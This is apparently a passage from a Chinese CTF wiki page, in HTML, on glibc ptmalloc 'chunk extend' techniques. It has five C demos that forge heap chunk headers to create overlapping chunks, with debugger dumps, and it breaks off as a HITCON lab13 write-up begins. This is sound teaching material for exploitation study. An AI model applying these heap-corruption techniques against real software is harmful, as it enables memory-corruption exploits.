+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2015-hacklu-bookstore" class="md-nav__link">
+    2015 hacklu bookstore
+  </a>
+  
+    <nav class="md-nav" aria-label="2015 hacklu bookstore">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    基本信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    堆溢出
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uaf" class="md-nav__link">
+    UAF
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    格式化字符串
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    奇怪的输入长度
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    思路
+  </a>
+  
+    <nav class="md-nav" aria-label="思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    控制格式化字符串内容
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fini_array" class="md-nav__link">
+    劫持 fini_array
+  </a>
+  
+    <nav class="md-nav" aria-label="劫持 fini_array">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#way-1" class="md-nav__link">
+    Way 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#way-2" class="md-nav__link">
+    Way 2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#main" class="md-nav__link">
+    修改 main 函数返回地址
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    补充总结
+  </a>
+  
+    <nav class="md-nav" aria-label="补充总结">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fini_array_1" class="md-nav__link">
+    怎么找 fini_array ？
+  </a>
+  
+    <nav class="md-nav" aria-label="怎么找 fini_array ？">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#64" class="md-nav__link">
+    64 位静态链接程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64_1" class="md-nav__link">
+    64 位动态链接程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    静态动态利用方式小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/glibc-heap/堆重叠&拓展.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="_1">堆拓展&amp;溢出<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p>
+</blockquote>
+<h2 id="_2">介绍<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p>
+<ul>
+<li>程序中存在基于堆的漏洞</li>
+<li>漏洞可以控制 chunk header 中的数据</li>
+</ul>
+<h2 id="_3">原理<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p>
+<p>在 ptmalloc 中，**获取 chunk 块大小**的操作如下</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* Get size, ignoring use bits */</span>
+<span class="cp">#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span>
+
+<span class="cm">/* Like chunksize, but do not mask SIZE_BITS.  */</span>
+<span class="cp">#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</span>
+</code></pre></div>
+<p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p>
+<p>在 ptmalloc 中，**获取下一 chunk 块地址**的操作如下</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* Ptr to next physical malloc_chunk. */</span>
+<span class="cp">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span>
+</code></pre></div>
+<p>即使用当前块指针加上当前块大小。</p>
+<p>在 ptmalloc 中，**获取前一个 chunk 信息**的操作如下</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span>
+<span class="cp">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span>
+
+<span class="cm">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span>
+<span class="cp">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span>
+</code></pre></div>
+<p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p>
+<p>在 ptmalloc，**判断当前 chunk 是否是 use 状态**的操作如下：</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#define inuse(p)</span>
+    <span class="p">((((</span><span class="n">mchunkptr</span><span class="p">)(((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">+</span> <span class="n">chunksize</span><span class="p">(</span><span class="n">p</span><span class="p">)))</span><span class="o">-&gt;</span><span class="n">mchunk_size</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">PREV_INUSE</span><span class="p">)</span>
+</code></pre></div>
+<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
+<p>更多的操作详见 <code>堆相关数据结构</code> 一节。</p>
+<p>通过上面几个宏可以看出，<em>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位</em>。简而言之，<strong>chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的</strong>。</p>
+<p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p>
+<blockquote>
+<p><strong>以下示例代码，谨慎加入 printf 等函数，因为程序没有初始化缓冲区，如果引入这些函数的话，程序会创建一个堆用作缓存</strong></p>
+</blockquote>
+<h2 id="1-inuse-fastbin-extend">基本示例 1：对 inuse 的 fastbin 进行 extend<a class="headerlink" href="#1-inuse-fastbin-extend" title="Permanent link">&para;</a></h2>
+<p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 <strong>注意，我们的示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节</strong>。</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="o">*</span><span class="n">ptr1</span><span class="p">;</span>
+
+    <span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//分配第一个0x10的chunk</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//分配第二个0x10的chunk</span>
+
+    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span><span class="mh">-0x8</span><span class="p">)</span><span class="o">=</span><span class="mh">0x41</span><span class="p">;</span><span class="c1">// 修改第一个块的size域</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+    <span class="n">ptr1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span><span class="c1">// 实现 extend，控制了第二个块的内容</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>当两个 malloc 语句执行之后，堆的内存分布如下</p>
+<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;<span class="o">===</span> chunk <span class="m">1</span>
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000021 &lt;<span class="o">===</span> chunk <span class="m">2</span>
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;<span class="o">===</span> top chunk
+</code></pre></div>
+<p>之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。</p>
+<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;<span class="o">===</span> 篡改大小
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000021
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000020fc1 
+</code></pre></div>
+<p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p>
+<div class="highlight"><pre><span></span><code>Fastbins<span class="o">[</span><span class="nv">idx</span><span class="o">=</span><span class="m">0</span>, <span class="nv">size</span><span class="o">=</span>0x10<span class="o">]</span> 0x00
+Fastbins<span class="o">[</span><span class="nv">idx</span><span class="o">=</span><span class="m">1</span>, <span class="nv">size</span><span class="o">=</span>0x20<span class="o">]</span> 0x00
+Fastbins<span class="o">[</span><span class="nv">idx</span><span class="o">=</span><span class="m">2</span>, <span class="nv">size</span><span class="o">=</span>0x30<span class="o">]</span>  ←  Chunk<span class="o">(</span><span class="nv">addr</span><span class="o">=</span>0x602010, <span class="nv">size</span><span class="o">=</span>0x40, <span class="nv">flags</span><span class="o">=</span>PREV_INUSE<span class="o">)</span> 
+Fastbins<span class="o">[</span><span class="nv">idx</span><span class="o">=</span><span class="m">3</span>, <span class="nv">size</span><span class="o">=</span>0x40<span class="o">]</span> 0x00
+Fastbins<span class="o">[</span><span class="nv">idx</span><span class="o">=</span><span class="m">4</span>, <span class="nv">size</span><span class="o">=</span>0x50<span class="o">]</span> 0x00
+Fastbins<span class="o">[</span><span class="nv">idx</span><span class="o">=</span><span class="m">5</span>, <span class="nv">size</span><span class="o">=</span>0x60<span class="o">]</span> 0x00
+Fastbins<span class="o">[</span><span class="nv">idx</span><span class="o">=</span><span class="m">6</span>, <span class="nv">size</span><span class="o">=</span>0x70<span class="o">]</span> 0x00
+</code></pre></div>
+<p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p>
+<div class="highlight"><pre><span></span><code><span class="n">call</span>   <span class="mh">0x400450</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="mh">-0x8</span><span class="p">],</span> <span class="n">rax</span>
+
+<span class="n">rax</span> <span class="o">=</span> <span class="mh">0x602010</span>
+</code></pre></div>
+<h3 id="_4">注解<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>因为 fastbin 追求效率，安全校验机制弱，free 时找到 fastbin 链表中对应大小链表就放入了。prev_inuse 等不会校验。物理地址相邻的空闲 fastbin 不会合并。</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-01-jG6JPvPb6JSupFko.png" /><sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup></p>
+<h2 id="2-inuse-smallbin-extend">基本示例 2：对 inuse 的 smallbin 进行 extend<a class="headerlink" href="#2-inuse-smallbin-extend" title="Permanent link">&para;</a></h2>
+<p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70）</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="o">*</span><span class="n">ptr1</span><span class="p">;</span>
+
+    <span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span><span class="c1">//分配第一个 0x80 的chunk1</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> <span class="c1">//分配第二个 0x10 的chunk2</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> <span class="c1">//防止与top chunk合并的chunk3</span>
+
+    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">ptr</span><span class="mh">-0x8</span><span class="p">)</span><span class="o">=</span><span class="mh">0xb1</span><span class="p">;</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+    <span class="n">ptr1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>
+<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000000
+0x602050:   0x0000000000000000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000000
+0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk
+0x6020c0:   0x0000000000000000  0x0000000000000000
+0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk
+</code></pre></div>
+<p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin ，chunk3 prev_size 写入 0xb0 ，prev_inuse 为 0 ：</p>
+<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin
+0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000000
+0x602050:   0x0000000000000000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000000
+0x602090:   0x0000000000000000  0x0000000000000021
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空
+0x6020c0:   0x0000000000000000  0x0000000000000000
+0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk
+[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
+ →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
+</code></pre></div>
+<p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p>
+<div class="highlight"><pre><span></span><code>     0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;
+ →   0x4005b5 &lt;main+79&gt;        mov    QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>, rax
+
+     rax : 0x0000000000602010
+</code></pre></div>
+<h2 id="3-free-smallbin-extend">基本示例 3：对 free 的 smallbin 进行 extend<a class="headerlink" href="#3-free-smallbin-extend" title="Permanent link">&para;</a></h2>
+<p>示例 3 是在示例 2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="o">*</span><span class="n">ptr1</span><span class="p">;</span>
+
+    <span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span><span class="c1">//分配第一个0x80的chunk1</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//分配第二个0x10的chunk2</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span><span class="c1">//首先进行释放，使得chunk1进入unsorted bin</span>
+
+    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">ptr</span><span class="mh">-0x8</span><span class="p">)</span><span class="o">=</span><span class="mh">0xb1</span><span class="p">;</span>
+    <span class="n">ptr1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>两次 malloc 之后的结果如下</p>
+<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 1
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000000
+0x602050:   0x0000000000000000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000000
+0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x0000000000000000  0x0000000000020f51
+</code></pre></div>
+<p>我们首先释放 chunk1 使它进入 unsorted bin 中</p>
+<div class="highlight"><pre><span></span><code>     unsorted_bins[0]: fw=0x602000, bk=0x602000
+ →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)
+
+0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin
+0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000000
+0x602050:   0x0000000000000000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000000
+0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk
+</code></pre></div>
+<p>然后篡改 chunk1 的 size 域</p>
+<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== size域被篡改
+0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000000
+0x602050:   0x0000000000000000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000000
+0x602090:   0x0000000000000090  0x0000000000000020
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x0000000000000000  0x0000000000020f51
+</code></pre></div>
+<p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。<sup id="fnref:2"><a class="footnote-ref" href="#fn:2">2</a></sup></p>
+<h2 id="chunk-extendshrink">Chunk Extend/Shrink 可以做什么<a class="headerlink" href="#chunk-extendshrink" title="Permanent link">&para;</a></h2>
+<p>一般来说，这种技术并不能直接控制程序的执行流程，但是**可以控制 chunk 中的内容**。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
+<p>此外**通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用**。</p>
+<h2 id="4-extend-overlapping">基本示例 4：通过 extend 后向 overlapping<a class="headerlink" href="#4-extend-overlapping" title="Permanent link">&para;</a></h2>
+<p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="o">*</span><span class="n">ptr1</span><span class="p">;</span>
+
+    <span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//分配第1个 0x80 的chunk1</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> <span class="c1">//分配第2个 0x10 的chunk2</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> <span class="c1">//分配第3个 0x10 的chunk3</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> <span class="c1">//分配第4个 0x10 的chunk4    </span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">ptr</span><span class="mh">-0x8</span><span class="p">)</span><span class="o">=</span><span class="mh">0x61</span><span class="p">;</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+    <span class="n">ptr1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>初始化分配 4 个堆之后：</p>
+<p><img alt="" src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170104.png" /></p>
+<p>将第一个 chunk size 修改为 0x61 ，然后 free 第一个堆块，红框内的都会被当做一个整体放入到 fastbin 当中：</p>
+<p><img alt="" src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170205.png" /></p>
+<p><img alt="" src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170307.png" /></p>
+<p>那么当再次分配大小为 0x50 （不含chunk header）时，就会调用这块内存了：</p>
+<p><img alt="" src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801171023.png" /></p>
+<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
+<h2 id="5-extend-overlapping">基本示例 5：通过 extend 前向 overlapping<a class="headerlink" href="#5-extend-overlapping" title="Permanent link">&para;</a></h2>
+<p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面（低地址）的块</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr1</span><span class="p">,</span><span class="o">*</span><span class="n">ptr2</span><span class="p">,</span><span class="o">*</span><span class="n">ptr3</span><span class="p">,</span><span class="o">*</span><span class="n">ptr4</span><span class="p">;</span>
+    <span class="n">ptr1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span><span class="c1">//smallbin1</span>
+    <span class="n">ptr2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//fastbin1</span>
+    <span class="n">ptr3</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//fastbin2</span>
+    <span class="n">ptr4</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span><span class="c1">//smallbin2</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//防止与top合并</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">ptr1</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr4</span><span class="mh">-0x8</span><span class="p">)</span><span class="o">=</span><span class="mh">0x90</span><span class="p">;</span><span class="c1">//修改pre_inuse域，prev_inuse</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr4</span><span class="mh">-0x10</span><span class="p">)</span><span class="o">=</span><span class="mh">0xd0</span><span class="p">;</span><span class="c1">//修改pre_size域，prev_size</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">ptr4</span><span class="p">);</span><span class="c1">//unlink进行前向extend</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x150</span><span class="p">);</span><span class="c1">//占位块</span>
+
+<span class="p">}</span>
+</code></pre></div>
+<p>这里例子调试一直出不来堆信息，就文字描述一下：（大佬笔记：<a href="https://bbs.pediy.com/thread-260316.htm">https://bbs.pediy.com/thread-260316.htm</a>）</p>
+<p>先布置好 5 个堆块，然后释放 ptr1 进入到 unsortedbin 。</p>
+<p>修改 ptr4 的 prev_inuse 为 0 标记前一个堆块释放（空闲），绕过 next_chunk inuse 检查。
+修改 ptr4 的 prev_size 为 ptr1+ptr2+ptr3 ，绕过 next_chunk size == chunk size 检查。</p>
+<p>释放 ptr4 会触发回收机制，也就是合并物理相邻的堆，用到的操作是 unlink ，就将 ptr1~4 当做一个堆块放入 unsortedbin。</p>
+<p><strong>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</strong></p>
+<h2 id="hitcon-trainging-lab13">HITCON Trainging lab13<a class="headerlink" href="#hitcon-trainging-lab13" title="Permanent link">&para;</a></h2>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">题目链接</a></p>
+<h3 id="_5">基本信息<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</code></pre></div>
+<p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护，还有一点就是 <code>RELRO:    Partial RELRO</code> GOT 表可以修改。</p>
+<h3 id="_6">基本功能<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>程序是一个堆管理器，有增删查改功能。</p>
+<p>每个 content 堆块用一个 0x10 的结构体堆去维护，结构体如下：</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">chunk</span><span class="p">{</span>
+    <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>        <span class="c1">//context 大小</span>
